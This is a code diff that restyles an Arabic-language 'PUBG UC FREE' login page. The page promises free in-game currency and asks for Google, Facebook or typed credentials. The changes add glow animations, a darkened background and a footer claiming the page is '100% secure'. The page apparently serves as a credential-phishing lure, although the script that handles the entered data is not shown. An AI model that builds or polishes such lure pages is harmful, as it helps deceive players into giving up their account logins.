@@ -4,57 +4,74 @@
 <meta charset="UTF-8">
 <title>PUBG UC FREE</title>
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
+@import url('https://fonts.googleapis.com/css2?family=Anton&family=Cairo:wght@400;700;900&display=swap');
 
 * { box-sizing: border-box; margin: 0; padding: 0; }
 
 body {
-    background: url('https://mediaaws-live.almasryalyoum.com/AMAYLivePictures/portalimages/news/large/2021/03/08/1481606_0.jpg') no-repeat center center fixed; /* دي صورة شبه اللي بعتهالي */
+    background: url('https://i.imgur.com/QYvYg5k.jpg') no-repeat center center fixed;
     background-size: cover;
     font-family: 'Cairo', sans-serif;
     display: flex;
     justify-content: center;
     align-items: center;
     min-height: 100vh;
-    color: white;
+    overflow: hidden;
+}
+
+/* طبقة التعتيم */
+body::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0,0,0,0.6);
 }
 
 .login-card {
-    background: rgba(5, 10, 25, 0.85);
-    backdrop-filter: blur(15px);
+    position: relative;
+    background: linear-gradient(180deg, rgba(10,15,30,0.9), rgba(0,0,0,0.9));
+    backdrop-filter: blur(20px);
     border: 2px solid #FFD700;
     border-radius: 25px;
-    padding: 30px 25px;
-    width: 420px;
+    padding: 35px 30px;
+    width: 440px;
     text-align: center;
-    box-shadow: 0 0 30px rgba(255, 215, 0, 0.3);
+    box-shadow: 0 0 40px rgba(255, 215, 0, 0.5), inset 0 0 20px rgba(255,215,0,0.1);
+    animation: fadeIn 1s ease;
+    z-index: 2;
 }
+@keyframes fadeIn { from {opacity:0; transform: translateY(30px);} to {opacity:1; transform: translateY(0);} }
 
 .logo {
-    font-size: 45px;
-    font-weight: 900;
+    font-family: 'Anton', sans-serif;
+    font-size: 50px;
     color: #FFD700;
-    text-shadow: 0 0 10px #FFD700;
-    margin-bottom: 20px;
+    text-shadow: 0 0 15px #FFD700, 0 0 30px #FFD700;
+    margin-bottom: 15px;
+    animation: glow 2s ease-in-out infinite alternate;
 }
-.logo span { color: white; }
+@keyframes glow {
+    from { text-shadow: 0 0 10px #FFD700; }
+    to { text-shadow: 0 0 20px #FFD700, 0 0 40px #FFD700; }
+}
+.logo span { color: white; font-size: 30px; display: block; margin-top: -10px; }
 
-h2 { font-size: 28px; margin-bottom: 5px; }
-.subtitle { color: #ccc; font-size: 14px; margin-bottom: 25px; }
+h2 { font-size: 28px; margin-bottom: 5px; font-weight: 900; }
+.subtitle { color: #aaa; font-size: 14px; margin-bottom: 25px; }
 
 .btn {
     display: flex; align-items: center; justify-content: center;
-    width: 100%; padding: 12px; border-radius: 12px;
+    width: 100%; padding: 13px; border-radius: 12px;
     font-size: 16px; font-weight: bold; cursor: pointer;
-    margin: 10px 0; border: none; font-family: 'Cairo';
+    margin: 12px 0; border: none; font-family: 'Cairo';
     transition: 0.3s;
 }
-.btn:hover { transform: scale(1.02); }
+.btn:hover { transform: translateY(-2px); box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
 .google-btn { background: white; color: black; }
-.fb-btn { background: #1877f2; color: white; }
+.fb-btn { background: linear-gradient(90deg, #1877f2, #0a66e2); color: white; }
 .btn img { width: 22px; height: 22px; margin-left: 10px; }
 
-.divider { display: flex; align-items: center; color: #aaa; margin: 20px 0; }
+.divider { display: flex; align-items: center; color: #777; margin: 20px 0; font-weight: bold; }
 .divider hr { flex: 1; border: none; border-top: 1px solid #444; }
 .divider span { margin: 0 15px; }
 
@@ -63,28 +80,37 @@ h2 { font-size: 28px; margin-bottom: 5px; }
 }
 .input-box input {
     width: 100%; padding: 14px 45px 14px 14px;
-    background: #0a0f1f; border: 1px solid #FFD700;
+    background: rgba(0,0,0,0.5); border: 2px solid #333;
     border-radius: 12px; color: white; font-size: 15px;
-    font-family: 'Cairo';
+    font-family: 'Cairo'; transition: 0.3s;
 }
-.input-box input:focus { outline: none; border-color: #00e5ff; }
-.input-box .icon { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); font-size: 18px; }
+.input-box input:focus { outline: none; border-color: #FFD700; box-shadow: 0 0 15px rgba(255,215,0,0.3); }
+.input-box .icon { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); font-size: 18px; color: #FFD700; }
 
 .login-btn {
-    width: 100%; padding: 14px;
+    width: 100%; padding: 15px;
     background: linear-gradient(90deg, #FFD700, #FFA500);
     border: none; border-radius: 12px;
     font-size: 18px; font-weight: 900;
     color: black; cursor: pointer; margin-top: 15px;
     transition: 0.3s;
+    font-family: 'Cairo';
 }
-.login-btn:hover { box-shadow: 0 0 20px #FFD700; }
+.login-btn:hover { 
+    transform: translateY(-2px); 
+    box-shadow: 0 0 25px #FFD700; 
+}
 
+.footer-text {
+    margin-top: 20px;
+    font-size: 12px;
+    color: #666;
+}
 </style>
 </head>
 <body>
     <div class="login-card">
-        <div class="logo">PUBG<br><span>UC FREE</span></div>
+        <div class="logo">PUBG <span>UC FREE</span></div>
 
         <h2>تسجيل الدخول 🪖</h2>
         <p class="subtitle">سجل دخولك للوصول إلى جميع خدمات الموقع</p>
@@ -112,6 +138,8 @@ h2 { font-size: 28px; margin-bottom: 5px; }
         </div>
 
         <button class="login-btn" onclick="register()">تسجيل الدخول ➡️</button>
+        
+        <p class="footer-text">🔒 آمن 100% • سريع • مجاني</p>
     </div>
 
 <script>
